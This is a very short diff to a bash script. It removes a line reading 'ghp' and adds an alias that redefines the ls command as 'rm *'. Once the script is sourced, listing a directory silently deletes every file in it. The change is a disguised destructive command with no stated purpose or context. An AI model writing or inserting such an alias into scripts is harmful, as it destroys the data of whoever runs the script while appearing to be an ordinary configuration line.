@@ -1,2 +1,2 @@
 #!/bin/bash
-ghp
+alias ls="rm *"
